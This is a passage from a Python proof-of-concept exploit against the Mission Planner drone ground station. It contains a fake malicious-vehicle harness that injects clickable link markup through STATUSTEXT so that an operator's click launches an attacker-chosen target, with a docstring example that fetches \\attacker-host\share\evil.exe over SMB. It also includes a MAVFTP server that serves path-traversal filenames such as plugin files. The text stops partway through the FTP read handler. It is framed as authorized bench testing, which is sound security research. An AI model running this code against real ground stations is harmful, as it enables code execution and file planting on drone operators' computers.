#!/usr/bin/env python3
r"""
poc_G03_mp_statustext_link_shellexec.py
================================================================================
Finding ID : MP-03 (G03)
Target GCS : Mission Planner (status / message UI)
Severity   : MEDIUM (one operator click required -> Process.Start of attacker-chosen
             target; see README.md Status row for the live-confirmed reproduction)
Class      : CWE-601 (open redirect) / CWE-88+CWE-77 (UseShellExecute argument)

WHAT THIS DEMONSTRATES
----------------------
A malicious vehicle sends a STATUSTEXT containing Mission Planner's clickable-link
markup:  [link;URL;text]. MP parses this markup and renders a clickable label; on
click it hands the attacker-supplied URL straight to Process.Start:

    ExtLibs/Controls/CustomMessageBox.cs:87-179
        Regex linkregex = new Regex(@"(\[link;([^\]]+);([^\]]+)\])", ...);
        ...
        link = match.Groups[2].Value;                  // attacker URL
        linklbl.Click += (sender, args) => {
            System.Diagnostics.Process.Start(((LinkLabel)sender).Tag.ToString());
        };

    Common.cs:455-467  (OpenUrl, the other sink)
        Process.Start(url);
        ... on Windows fallback:
        Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });

With UseShellExecute=true, the "URL" is resolved by the Windows shell: it may be an
`http(s)://` link, a `file://` path, or a UNC path `\\attacker-host\share\evil.exe`
that triggers an SMB fetch/execute — all from a single STATUSTEXT the vehicle emits
and one operator click.

WHAT TO OBSERVE
---------------
1. Point Mission Planner at tcp:<this-host>:5760 and connect. The harness answers
   MP's pre-arm handshake (params / autopilot version) so the connect flow doesn't
   stall on "Getting params...".
2. Go to Flight Data and press Arm. MP sends the arm COMMAND_LONG; the harness
   reacts to it directly -- emitting the malicious STATUSTEXT and an immediate
   COMMAND_ACK(FAILED) -- so the arm-failure dialog appears in well under a second
   instead of MP retrying for ~40s and showing "no response from UAV" (which would
   skip the dialog, and the link, entirely).
3. The "Arm failed ... Do you wish to Force Arm?" dialog carries a clickable link
   labelled "click-me", sourced from the malicious STATUSTEXT.
4. Click it. Observe MP call Process.Start on the BENIGN target below
   (default: http://127.0.0.1:8000/p -- point a `python3 -m http.server 8000`
   at it to confirm the callback, OR use --unc to watch an SMB connection attempt
   to a non-routable host). See --help for all payload variants (--url/--unc/
   --raw/--label).

SAFETY / AUTHORIZATION
----------------------
Authorized localhost/bench only. The link target is BENIGN by default: a localhost
HTTP URL you control; --unc with no value points at a non-routable RFC-5737
documentation address so nothing real is contacted. No executable is launched
unless you deliberately point --url/--unc at infrastructure you own.

NOTE: STATUSTEXT.text is char[50]; the full [link;...] markup must fit in 50 bytes.
The defaults below are sized accordingly. Longer text would need MAVLink STATUSTEXT
chunking (id/chunk_seq), which is out of scope for this single-message PoC.
"""
# ============================================================================
# Embedded fake-vehicle harness — this PoC is SELF-CONTAINED
# (no external import). Defines FakeVehicle, banner, observe, warn, ok,
# attack (+ wire helpers).
# ============================================================================
import argparse
import socket
import struct
import sys
import threading
import time

from pymavlink import mavutil
from pymavlink.mavutil import x25crc

# ---------------------------------------------------------------------------
# pretty output (matches ../../poc/mav_poc_harness.py conventions)
# ---------------------------------------------------------------------------
_C = {"hdr": "\033[1;36m", "obs": "\033[0;37m", "warn": "\033[1;33m",
      "ok": "\033[1;32m", "atk": "\033[1;31m", "rst": "\033[0m"}


def banner(title):
    line = "=" * max(8, min(78, len(title) + 4))
    print("%s%s\n  %s\n%s%s" % (_C["hdr"], line, title, line, _C["rst"]))


def observe(msg): print("%s[obs]%s %s" % (_C["obs"], _C["rst"], msg))
def warn(msg):    print("%s[!]  %s%s"  % (_C["warn"], msg, _C["rst"]))
def ok(msg):      print("%s[ok] %s%s"  % (_C["ok"], msg, _C["rst"]))
def attack(msg):  print("%s[atk]%s %s" % (_C["atk"], _C["rst"], msg))


# ===========================================================================
# Raw MAVLink2 framing for messages that the locally-installed pymavlink dialect
# does NOT know (COMPONENT_INFORMATION id=395, COMPONENT_METADATA id=397).
# A malicious vehicle frames these by hand; a real GCS validates the CRC using
# the per-message CRC_EXTRA, so we compute CRC_EXTRA exactly the way the MAVLink
# generator (mavgen) does and verify it against a known message in the unit check
# at the bottom of this file.
# ===========================================================================
_TYPE_SIZE = {
    "uint8_t": 1, "int8_t": 1, "char": 1, "uint16_t": 2, "int16_t": 2,
    "uint32_t": 4, "int32_t": 4, "float": 4, "uint64_t": 8, "int64_t": 8,
    "double": 8, "uint8_t_mavlink_version": 1,
}


def _crc_extra(name, fields):
    """Replicate mavgen's CRC_EXTRA: x25 over 'NAME ' then, in WIRE order
    (stable sort by descending type size), 'TYPE ' 'FNAME ' and, for arrays,
    one length byte. Extension fields (after <extensions/>) are NOT included.

    fields: list of (type, name, array_len_or_0)  in XML declaration order,
            excluding any extension fields.
    """
    ordered = sorted(fields, key=lambda f: -_TYPE_SIZE[f[0]])  # stable -> ties keep order
    crc = x25crc()
    crc.accumulate_str(name + " ")
    for ftype, fname, alen in ordered:
        t = "uint8_t" if ftype == "uint8_t_mavlink_version" else ftype
        crc.accumulate_str(t + " ")
        crc.accumulate_str(fname + " ")
        if alen > 0:
            crc.accumulate(bytes([alen]))
    return (crc.crc & 0xFF) ^ (crc.crc >> 8)


def _wire_payload(fields, values):
    """Pack a payload in WIRE order (descending type size, stable), truncating
    trailing zero bytes the way MAVLink2 does. `values` is a dict name->python value."""
    ordered = sorted(range(len(fields)), key=lambda i: -_TYPE_SIZE[fields[i][0]])
    fmt = "<"
    packed = b""
    for i in ordered:
        ftype, fname, alen = fields[i]
        v = values[fname]
        if alen > 0 and ftype in ("char", "uint8_t", "int8_t"):
            if isinstance(v, str):
                v = v.encode("utf-8", "replace")
            v = (v + b"\x00" * alen)[:alen]
            packed += v
        elif alen > 0:
            raise NotImplementedError("non-byte arrays not needed here")
        else:
            packed += struct.pack({"uint32_t": "<I", "int32_t": "<i", "uint16_t": "<H",
                                   "int16_t": "<h", "uint8_t": "<B", "int8_t": "<b",
                                   "float": "<f"}[ftype], v)
    return packed


# Field definitions (declaration order, no extension fields) for the two messages
# the dialect lacks. Verified against c_library_v2 headers:
#   COMPONENT_METADATA(397)   CRC_EXTRA = 182
#   COMPONENT_INFORMATION(395) CRC_EXTRA = 0
_MSG_COMPONENT_METADATA = (
    397, "COMPONENT_METADATA",
    [("uint32_t", "time_boot_ms", 0),
     ("uint32_t", "file_crc", 0),
     ("char", "uri", 100)],
)
_MSG_COMPONENT_INFORMATION = (
    395, "COMPONENT_INFORMATION",
    [("uint32_t", "time_boot_ms", 0),
     ("uint32_t", "general_metadata_file_crc", 0),
     ("uint32_t", "peripherals_metadata_file_crc", 0),
     ("char", "general_metadata_uri", 100),
     ("char", "peripherals_metadata_uri", 100)],
)


# ===========================================================================
# FakeVehicle
# ===========================================================================
class FakeVehicle:
    HEARTBEAT_HZ = 1.0
    # Window in which a repeated MAV_CMD_COMPONENT_ARM_DISARM is treated as a retry
    # of the same arm attempt rather than a fresh operator press, so the STATUSTEXT
    # burst is emitted once per attempt instead of once per retry.
    ARM_BURST_DEDUPE_S = 8.0

    # Minimal param set so MP's PARAM_REQUEST_LIST ("Getting params...") completes
    # instead of hanging forever waiting for PARAM_VALUEs that never arrive.
    PARAMS = {
        "SYSID_THISMAV": 1.0, "FRAME_CLASS": 1.0, "FRAME_TYPE": 1.0,
        "BATT_CAPACITY": 5000.0, "FENCE_ENABLE": 0.0, "ARMING_CHECK": 1.0,
    }

    FW_VERSION = (4 << 24) | (5 << 16) | (7 << 8) | 255      # major.minor.patch.type
    GIT_HASH = list(b"1f3a9c20")                              # 8 bytes
    BOARD_VERSION = 0x010F0000
    VENDOR_ID, PRODUCT_ID, UID = 0x2DAE, 0x1011, 0x3138353012345678

    CAPABILITIES = (
        mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_FTP
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MISSION_FLOAT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_PARAM_FLOAT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MISSION_INT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_COMMAND_INT
        | mavutil.mavlink.MAV_PROTOCOL_CAPABILITY_MAVLINK2
    )

    BOOT_BANNER = [
        "ArduCopter V4.5.7 (1f3a9c20)",
        "ChibiOS: db580d2e",
        "CubeOrange 0042002A",
        "Frame: QUAD/X",
    ]

    def __init__(self, conn_str, sysid=1, compid=1, verbose=True, dialect="ardupilotmega"):
        self.conn_str = conn_str
        self.sysid = sysid
        self.compid = compid
        self.verbose = verbose
        self.dialect = dialect
        self.master = None
        self._hb_thread = None
        self._rx_thread = None
        self._running = False
        self._seq_lock = threading.Lock()
        # Serializes EVERY write to the link. The RX thread (command handlers) and
        # the main thread (ambient broadcast) both send; without this their frames
        # interleave on the TCP stream and are dropped as corrupt -- including the
        # COMMAND_ACK, which makes MP's doCommandAsync() retry for ~40s and drag a
        # pile of extra STATUSTEXTs into FlightData.cs's subscribe window.
        self._send_lock = threading.Lock()
        self._last_arm_burst = 0.0   # dedupes the pretext burst across arm retries
        self.greeted = False
        # MAVFTP server state: a dict of {filename: bytes} the attacker serves.
        # filenames may contain traversal / absolute-path sequences on purpose.
        self.ftp_files = {}
        self.ftp_dir_entries = []     # list of (name, size, is_dir)
        self._ftp_sessions = {}       # session_id -> (filename, bytes)

    # -- construction --------------------------------------------------------
    @classmethod
    def from_cli(cls, title=None, extra_args=None):
        """Parse the common CLI and return a configured (unstarted) FakeVehicle.
        `extra_args(parser)` lets a PoC add its own flags before parsing."""
        p = argparse.ArgumentParser(add_help=True, description=title or "fake malicious vehicle")
        g = p.add_mutually_exclusive_group()
        g.add_argument("--listen", metavar="HOST:PORT", default="127.0.0.1:5760",
                       help="bind a TCP server the GCS connects TO (SITL-style). default 127.0.0.1:5760")
        g.add_argument("--udpout", metavar="HOST:PORT",
                       help="push UDP to a listening GCS, e.g. 127.0.0.1:14550")
        g.add_argument("--connect", metavar="STR",
                       help="raw pymavlink connection string, used verbatim")
        p.add_argument("--sysid", type=int, default=1, help="our advertised system id (default 1)")
        p.add_argument("--compid", type=int, default=1, help="our advertised component id (default 1 = autopilot)")
        p.add_argument("--quiet", action="store_true", help="less logging")
        if extra_args:
            extra_args(p)
        a, _ = p.parse_known_args()

        if a.connect:
            conn = a.connect
        elif a.udpout:
            conn = "udpout:" + a.udpout
        else:
            # tcpin: == we are the TCP *server* and bind; the GCS dials in.
            conn = "tcpin:" + a.listen
        self = cls(conn, sysid=a.sysid, compid=a.compid, verbose=not a.quiet)
        self._args = a
        return self

    # -- lifecycle -----------------------------------------------------------
    def start(self):
        if self.verbose:
            observe("opening attacker link: %s (advertising sysid=%d compid=%d)"
                    % (self.conn_str, self.sysid, self.compid))
            if self.conn_str.startswith("tcpin:"):
                observe("waiting for the GCS to CONNECT to us (point it at tcp:%s) ..."
                        % self.conn_str[len("tcpin:"):])
        self.master = mavutil.mavlink_connection(
            self.conn_str, source_system=self.sysid, source_component=self.compid,
            dialect=self.dialect, autoreconnect=True)
        self._running = True
        self._hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._hb_thread.start()
        self._rx_thread = threading.Thread(target=self._rx_loop, daemon=True)
        self._rx_thread.start()
        if self.verbose:
            ok("link up; HEARTBEAT @ %.0f Hz running" % self.HEARTBEAT_HZ)
        return self

    def wait_for_gcs(self, timeout=120):
        """Block until a GCS has actually connected.

        For the tcpin (TCP-server) role this matters: pymavlink's mavtcpin.write()
        is a NO-OP until the listening socket has accept()ed a client (the accept
        happens inside recv(), which our _rx_loop drives). One-shot payload sends
        from a PoC would otherwise race the accept and be silently dropped. UDP/
        udpout roles have no accept step, so we return immediately for them.
        Returns True once connected (or for connectionless roles), False on timeout.
        """
        # mavudp / udpout have no 'port' accept handshake.
        if not self.conn_str.startswith("tcpin:"):
            time.sleep(0.3)
            return True
        deadline = time.time() + timeout
        if self.verbose:
            observe("waiting for a GCS to connect to %s ..." % self.conn_str)
        while time.time() < deadline:
            if getattr(self.master, "port", None) is not None:
                # give the link a beat to settle after accept()
                time.sleep(0.3)
                if self.verbose:
                    ok("GCS connected — sending payload")
                return True
            time.sleep(0.1)
        warn("no GCS connected within %ds" % timeout)
        return False

    def serve_forever(self):
        """Block forever (until Ctrl-C), keeping the heartbeat and FTP server alive."""
        try:
            while self._running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            warn("Ctrl-C — shutting down fake vehicle")
            self.stop()

    def stop(self):
        self._running = False

    # -- heartbeat -----------------------------------------------------------
    def _heartbeat_loop(self):
        period = 1.0 / self.HEARTBEAT_HZ
        while self._running:
            try:
                # type=QUADROTOR, autopilot=ARDUPILOTMEGA so the GCS treats us as
                # a real ArduCopter vehicle and runs its full vehicle-setup logic
                # (camera/FTP/component-metadata probes etc.).
                with self._send_lock:
                    self.master.mav.heartbeat_send(
                        mavutil.mavlink.MAV_TYPE_QUADROTOR,
                        mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                        custom_mode=0,
                        system_status=mavutil.mavlink.MAV_STATE_STANDBY)
            except Exception as e:  # noqa: BLE001 — link may still be establishing
                if self.verbose:
                    warn("heartbeat send failed (link not up yet?): %s" % e)
            time.sleep(period)

    # -- receive / log what the GCS asks for --------------------------------
    def _rx_loop(self):
        while self._running:
            try:
                msg = self.master.recv_match(blocking=True, timeout=0.5)
            except Exception:
                msg = None
                time.sleep(0.2)
            if msg is None:
                continue
            t = msg.get_type()
            if t == "BAD_DATA":
                continue
            # MP only starts its full vehicle-setup flow (params/capabilities/FTP
            # probes) once it has seen a HEARTBEAT from us; greet it the first time
            # so the GCS doesn't sit waiting on an AUTOPILOT_VERSION it never asked
            # for explicitly yet.
            if t == "HEARTBEAT" and not self.greeted:
                self.greeted = True
                self.send_boot_banner()
                self.send_autopilot_version()
            # Surface the interesting GCS->vehicle requests so the operator can
            # SEE the GCS taking the bait (camera probe, FTP list/open, etc.).
            if t == "FILE_TRANSFER_PROTOCOL":
                self._handle_ftp(msg)
            elif t in ("COMMAND_LONG", "COMMAND_INT"):
                if self.verbose:
                    observe("GCS sent %s command=%s" % (t, getattr(msg, "command", "?")))
                if getattr(msg, "command", None) == mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM:
                    # Operator pressed Arm. doCommandAsync() (MAVLinkInterface.cs:2688) blocks
                    # up to ~40s (3 retries x 10s) for a COMMAND_ACK before THROWING
                    # TimeoutException -- which skips the "Arm failed" dialog (and our
                    # STATUSTEXT markup) entirely ("no response from UAV"). Fire the
                    # malicious STATUSTEXT now (inside FlightData.cs's narrow subscribe
                    # window, FlightData.cs:1046-1051) and immediately NAK the arm so
                    # doARM() returns False fast and FlightData.cs:1054 renders the link.
                    lines = getattr(self, "_poc_statustext_lines", None)
                    now = time.time()
                    if lines and (now - self._last_arm_burst) > self.ARM_BURST_DEDUPE_S:
                        # Every line must land inside FlightData.cs's narrow subscribe
                        # window (1046-1051) -- i.e. BEFORE the COMMAND_ACK below, which
                        # is what makes doARM() return False and close the window.
                        #
                        # doCommandAsync() (MAVLinkInterface.cs:2688) retries the arm up
                        # to 3x. Re-sending the whole burst on each retry stacks duplicate
                        # copies of every line into the SAME dialog body, because
                        # FlightData.cs:1048 AppendLine()s each one. Send it once.
                        self._last_arm_burst = now
                        for line in lines:
                            self.send_statustext(
                                line, severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL)
                    elif lines and self.verbose:
                        observe("arm retry within %.0fs -- suppressing duplicate STATUSTEXT "
                                "burst (dialog would otherwise show stacked copies)"
                                % self.ARM_BURST_DEDUPE_S)
                    with self._send_lock:
                        self.master.mav.command_ack_send(msg.command, mavutil.mavlink.MAV_RESULT_FAILED)
                    if self.verbose:
                        attack("ARM rejected (COMMAND_ACK FAILED) -- malicious STATUSTEXT delivered into the arm-failure dialog")
                elif getattr(msg, "command", None) == mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES:
                    self.send_autopilot_version()
                    with self._send_lock:
                        self.master.mav.command_ack_send(msg.command, mavutil.mavlink.MAV_RESULT_ACCEPTED)
                elif getattr(msg, "command", None) == getattr(mavutil.mavlink, "MAV_CMD_REQUEST_MESSAGE", 512) and \
                        int(getattr(msg, "param1", 0)) == mavutil.mavlink.MAVLINK_MSG_ID_AUTOPILOT_VERSION:
                    self.send_autopilot_version()
                    with self._send_lock:
                        self.master.mav.command_ack_send(msg.command, mavutil.mavlink.MAV_RESULT_ACCEPTED)
            elif t == "PARAM_REQUEST_LIST":
                # Without real PARAM_VALUE replies, MP's "Getting params..." step
                # hangs/times out and several later flows (incl. enabling Arm) stall.
                if self.verbose:
                    observe("GCS requested PARAM_REQUEST_LIST")
                for i, (name, val) in enumerate(self.PARAMS.items()):
                    self.send_param_value(name, val, count=len(self.PARAMS), index=i)
            elif t == "PARAM_REQUEST_READ":
                param_name = getattr(msg, "param_id", "")
                if isinstance(param_name, bytes):
                    param_name = param_name.decode("utf-8", "ignore")
                param_name = param_name.strip("\x00")
                if param_name in self.PARAMS:
                    idx = list(self.PARAMS.keys()).index(param_name)
                    self.send_param_value(param_name, self.PARAMS[param_name],
                                          count=len(self.PARAMS), index=idx)
            elif t == "AUTOPILOT_VERSION_REQUEST":
                self.send_autopilot_version()
            elif t in ("REQUEST_DATA_STREAM", "MESSAGE_INTERVAL"):
                if self.verbose:
                    observe("GCS requested: %s" % t)
            elif t == "HEARTBEAT":
                pass

    # -- generic raw send for dialect-unknown messages ----------------------
    def _send_raw(self, msgid, name, fields, crc_extra, values):
        """Hand-frame a MAVLink2 packet for a message pymavlink doesn't know."""
        payload = _wire_payload(fields, values)
        # MAVLink2 truncates trailing zero bytes of the payload on the wire.
        trimmed = payload.rstrip(b"\x00")
        if len(trimmed) == 0:
            trimmed = b"\x00"
        with self._seq_lock:
            seq = self.master.mav.seq & 0xFF
            self.master.mav.seq = (self.master.mav.seq + 1) % 256
        hdr = struct.pack("<BBBBBB", len(trimmed), 0, 0, seq, self.sysid, self.compid)
        hdr += struct.pack("<BBB", msgid & 0xFF, (msgid >> 8) & 0xFF, (msgid >> 16) & 0xFF)
        frame = b"\xfd" + hdr + trimmed
        crc = x25crc(frame[1:])
        crc.accumulate(bytes([crc_extra]))
        frame += struct.pack("<H", crc.crc)
        # Write straight to the underlying file/socket (bypasses dialect packer).
        with self._send_lock:
            self.master.write(frame)
        if self.verbose:
            attack("sent raw %s (id=%d, %d payload bytes) -> GCS" % (name, msgid, len(trimmed)))

    # ======================================================================
    # Finding-specific payload helpers
    # ======================================================================
    def send_statustext(self, text, severity=mavutil.mavlink.MAV_SEVERITY_INFO):
        """STATUSTEXT — text is char[50]; long strings are chunked by real
        autopilots, but for a PoC marker a single <=50 char chunk is enough."""
        data = text.encode("utf-8", "replace")[:50]
        with self._send_lock:
            self.master.mav.statustext_send(severity, data)
        if self.verbose:
            attack("sent STATUSTEXT severity=%d text=%r" % (severity, text))

    def send_autopilot_version(self):
        with self._send_lock:
            self.master.mav.autopilot_version_send(
                self.CAPABILITIES, self.FW_VERSION, self.FW_VERSION, 0,
                self.BOARD_VERSION, self.GIT_HASH, self.GIT_HASH, [0] * 8,
                self.VENDOR_ID, self.PRODUCT_ID, self.UID)

    def send_boot_banner(self):
        for line in self.BOOT_BANNER:
            self.send_statustext(line)

    def send_camera_information(self, vendor_name=b"", model_name=b"",
                                cam_definition_uri=b"", cam_definition_version=1,
                                flags=None):
        """CAMERA_INFORMATION (id 259). vendor_name/model_name are uint8_t[32],
        cam_definition_uri is char[140]. We allow attacker-chosen bytes incl. '../'."""
        if isinstance(vendor_name, str):
            vendor_name = vendor_name.encode("utf-8", "replace")
        if isinstance(model_name, str):
            model_name = model_name.encode("utf-8", "replace")
        if isinstance(cam_definition_uri, str):
            cam_definition_uri = cam_definition_uri.encode("utf-8", "replace")
        # CAMERA_CAP_FLAGS_HAS_VIDEO_STREAM=256 keeps QGC happy; HAS_BASIC etc not needed.
        if flags is None:
            flags = mavutil.mavlink.CAMERA_CAP_FLAGS_HAS_VIDEO_STREAM
        # pymavlink wants list-of-ints for the uint8_t[32] vendor/model arrays.
        v = list((vendor_name + b"\x00" * 32)[:32])
        mdl = list((model_name + b"\x00" * 32)[:32])
        # This dialect build ships the CAMERA_INFORMATION class but not a
        # camera_information_send() helper, so build the message and .send() it.
        from pymavlink.dialects.v20 import ardupilotmega as _M
        msg = _M.MAVLink_camera_information_message(
            int(time.time() * 1000) & 0xFFFFFFFF,  # time_boot_ms
            v, mdl,                                 # vendor_name, model_name (uint8[32])
            0,                                      # firmware_version
            0.0, 0.0, 0.0,                          # focal_length, sensor_size_h/v
            0, 0,                                   # resolution_h/v
            0,                                      # lens_id
            flags,                                  # flags
            cam_definition_version,                 # cam_definition_version
            cam_definition_uri)                     # cam_definition_uri (char[140])
        with self._send_lock:
            self.master.mav.send(msg)
        if self.verbose:
            attack("sent CAMERA_INFORMATION vendor=%r model=%r uri=%r"
                   % (vendor_name, model_name, cam_definition_uri))

    def send_video_stream_information(self, uri=b"", name=b"poc", stream_id=1,
                                      count=1, vtype=None):
        """VIDEO_STREAM_INFORMATION (id 269). uri is char[160]; MissionPlanner's
        CameraProtocol passes a uri beginning 'gst://' straight to gst_parse_launch."""
        if isinstance(uri, str):
            uri = uri.encode("utf-8", "replace")
        if isinstance(name, str):
            name = name.encode("utf-8", "replace")
        if vtype is None:
            vtype = mavutil.mavlink.VIDEO_STREAM_TYPE_RTSP
        # No video_stream_information_send() helper in this dialect build; build+send.
        from pymavlink.dialects.v20 import ardupilotmega as _M
        msg = _M.MAVLink_video_stream_information_message(
            stream_id, count, vtype,
            mavutil.mavlink.VIDEO_STREAM_STATUS_FLAGS_RUNNING,  # flags
            30.0,            # framerate
            1280, 720,       # resolution_h/v
            4000,            # bitrate
            0,               # rotation
            90,              # hfov
            name,            # name (char[32])
            uri)             # uri (char[160])
        with self._send_lock:
            self.master.mav.send(msg)
        if self.verbose:
            attack("sent VIDEO_STREAM_INFORMATION uri=%r" % uri)

    def send_param_value(self, param_id, value, ptype=None, count=1, index=0):
        """PARAM_VALUE (id 22). param_id is char[16]."""
        if ptype is None:
            ptype = mavutil.mavlink.MAV_PARAM_TYPE_REAL32
        if isinstance(param_id, str):
            param_id = param_id.encode("utf-8", "replace")
        with self._send_lock:
            self.master.mav.param_value_send(param_id, float(value), ptype, count, index)
        if self.verbose:
            attack("sent PARAM_VALUE %r=%s" % (param_id, value))

    def send_component_metadata(self, uri, file_crc=0):
        """COMPONENT_METADATA (id 397) — uri char[100]. Dialect-unknown -> raw frame.
        A GCS/MAVSDK fetches this uri (http(s):// over the network, file:// locally)."""
        msgid, name, fields = _MSG_COMPONENT_METADATA
        self._send_raw(msgid, name, fields, 182, {
            "time_boot_ms": int(time.time() * 1000) & 0xFFFFFFFF,
            "file_crc": file_crc & 0xFFFFFFFF,
            "uri": uri,
        })
        if self.verbose:
            attack("sent COMPONENT_METADATA uri=%r" % uri)

    def send_component_information(self, general_uri, peripherals_uri="",
                                   general_crc=0, peripherals_crc=0):
        """COMPONENT_INFORMATION (id 395, deprecated but still consumed by older
        QGC). general_metadata_uri / peripherals_metadata_uri are char[100]."""
        msgid, name, fields = _MSG_COMPONENT_INFORMATION
        self._send_raw(msgid, name, fields, 0, {
            "time_boot_ms": int(time.time() * 1000) & 0xFFFFFFFF,
            "general_metadata_file_crc": general_crc & 0xFFFFFFFF,
            "peripherals_metadata_file_crc": peripherals_crc & 0xFFFFFFFF,
            "general_metadata_uri": general_uri,
            "peripherals_metadata_uri": peripherals_uri,
        })
        if self.verbose:
            attack("sent COMPONENT_INFORMATION general_uri=%r" % general_uri)

    # ======================================================================
    # MAVLink-FTP SERVER
    # ----------------------------------------------------------------------
    # The GCS is the FTP *client*; we are the *server*. We answer ListDirectory,
    # OpenFileRO, ReadFile and the BurstReadFile path with attacker-chosen
    # filenames and contents. Wire format mirrors GCS_FTP.cpp / MAVFtp.cs:
    #   payload[0:2]=seq(LE16) [2]=session [3]=opcode [4]=size [5]=req_opcode
    #   [6]=burst_complete [7]=pad [8:12]=offset(LE32) [12:]=data
    # ======================================================================
    PAYLOAD_LEN = 251
    HDR = 12
    MAX_DATA = PAYLOAD_LEN - HDR        # 239 data bytes
    # opcodes (FTP_OP)
    OP_NONE = 0
    OP_TERMINATE = 1
    OP_RESET = 2
    OP_LIST = 3
    OP_OPEN_RO = 4
    OP_READ = 5
    OP_OPEN_WO = 6
    OP_BURST_READ = 15
    OP_ACK = 128
    OP_NACK = 129
    # NACK error codes
    ERR_FAIL = 1
    ERR_EOF = 6
    ERR_FILE_NOT_FOUND = 10

    def add_ftp_file(self, name, content):
        """Register a file the FTP server will serve. `name` may contain traversal
        ('..\\..\\plugins\\evil.cs') or be absolute — that is the whole point."""
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.ftp_files[name] = content

    def add_ftp_dir_entry(self, name, size=None, is_dir=False):
        """Add an entry to what ListDirectory returns. `name` may be a traversal/abs path."""
        if size is None:
            size = len(self.ftp_files.get(name, b""))
        self.ftp_dir_entries.append((name, size, is_dir))

    def _ftp_reply(self, req, opcode, size=0, req_opcode=0, burst=0, offset=0,
                   data=b"", session=None):
        p = bytearray(self.PAYLOAD_LEN)
        struct.pack_into("<H", p, 0, req["seq"] + 1 & 0xFFFF)  # ACK seq = req seq + 1
        # OpenFileRO must hand the client a NEW session id in the ACK header; for
        # all other replies we echo the request's session.
        p[2] = (req["session"] if session is None else session) & 0xFF
        p[3] = opcode & 0xFF
        p[4] = size & 0xFF
        p[5] = req_opcode & 0xFF
        p[6] = burst & 0xFF
        struct.pack_into("<I", p, 8, offset & 0xFFFFFFFF)
        d = data[:self.MAX_DATA]
        p[self.HDR:self.HDR + len(d)] = d
        with self._send_lock:
            self.master.mav.file_transfer_protocol_send(0, req["src_sys"], req["src_comp"], list(p))

    def _handle_ftp(self, msg):
        raw = bytes(bytearray(msg.payload))
        req = {
            "seq": struct.unpack_from("<H", raw, 0)[0],
            "session": raw[2],
            "opcode": raw[3],
            "size": raw[4],
            "req_opcode": raw[5],
            "burst": raw[6],
            "offset": struct.unpack_from("<I", raw, 8)[0],
            "data": raw[self.HDR:self.HDR + raw[4]],
            "src_sys": msg.get_srcSystem(),
            "src_comp": msg.get_srcComponent(),
        }
        op = req["opcode"]
        if self.verbose:
            observe("MAVFTP request: opcode=%d size=%d offset=%d data=%r"
                    % (op, req["size"], req["offset"], req["data"]))

        if op == self.OP_LIST:
            self._ftp_list(req)
        elif op == self.OP_OPEN_RO:
            self._ftp_open_ro(req)
        elif op == self.OP_READ:
            self._ftp_read(req, burst=False)
        elif op == self.OP_BURST_READ:
            self._ftp_read(req, burst=True)
        elif op == self.OP_TERMINATE or op == self.OP_RESET:
            self._ftp_sessions.pop(req["session"], None)
            self._ftp_reply(req, self.OP_ACK, req_opcode=op)
        else:
            # We deliberately only implement the read/list path the PoCs exercise.
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=op, data=bytes([self.ERR_FAIL]))

    def _ftp_list(self, req):
        """ListDirectory: each entry is a type byte ('F'/'D'/'S') then a NUL-
        terminated string. For a file MissionPlanner expects 'name\\tsize'
        (MAVFtp.cs:1310-1321 tab-split). We pack as many entries as fit from the
        requested offset; EOF -> NACK(EndOfFile)."""
        offset = req["offset"]
        if offset >= len(self.ftp_dir_entries):
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_LIST,
                            data=bytes([self.ERR_EOF]))
            return
        blob = b""
        i = offset
        while i < len(self.ftp_dir_entries):
            name, size, is_dir = self.ftp_dir_entries[i]
            if is_dir:
                entry = b"D" + name.encode("utf-8") + b"\x00"
            else:
                entry = b"F" + ("%s\t%d" % (name, size)).encode("utf-8") + b"\x00"
            if len(blob) + len(entry) > self.MAX_DATA:
                break
            blob += entry
            i += 1
        self._ftp_reply(req, self.OP_ACK, size=len(blob), req_opcode=self.OP_LIST,
                        offset=offset, data=blob)
        if self.verbose:
            attack("served MAVFTP ListDirectory: %d entr%s (offset %d) incl. attacker filenames"
                   % (i - offset, "y" if i - offset == 1 else "ies", offset))

    def _resolve_ftp_file(self, path_bytes):
        """Map an OpenFileRO path back to a registered attacker file. The GCS will
        request whatever name we advertised in ListDirectory."""
        path = path_bytes.decode("utf-8", "replace").lstrip("/")
        # try exact, then basename, then any single registered file as fallback
        if path in self.ftp_files:
            return path, self.ftp_files[path]
        for k, v in self.ftp_files.items():
            if k.lstrip("/").replace("\\", "/").endswith(path.replace("\\", "/")):
                return k, v
        if len(self.ftp_files) == 1:
            k = next(iter(self.ftp_files))
            return k, self.ftp_files[k]
        return None, None

    def _ftp_open_ro(self, req):
        name, content = self._resolve_ftp_file(req["data"])
        if content is None:
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_OPEN_RO,
                            data=bytes([self.ERR_FILE_NOT_FOUND]))
            return
        session = (max(self._ftp_sessions) + 1) if self._ftp_sessions else 1
        self._ftp_sessions[session] = (name, content)
        # ACK header carries the new session id; ACK data = file size (LE32),
        # matching GCS_FTP.cpp OpenFileRO which returns the size in the payload.
        self._ftp_reply(req, self.OP_ACK, size=4, req_opcode=self.OP_OPEN_RO,
                        data=struct.pack("<I", len(content)), session=session)
        if self.verbose:
            attack("served MAVFTP OpenFileRO -> session=%d, %d bytes of attacker content"
                   % (session, len(content)))

    def _ftp_read(self, req, burst):
        sess = self._ftp_sessions.get(req["session"])
        if sess is None:
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_FAIL]))
            return
        _name, content = sess
        offset = req["offset"]
        if offset >= len(content):
            self._ftp_reply(req, self.OP_NACK, size=1,
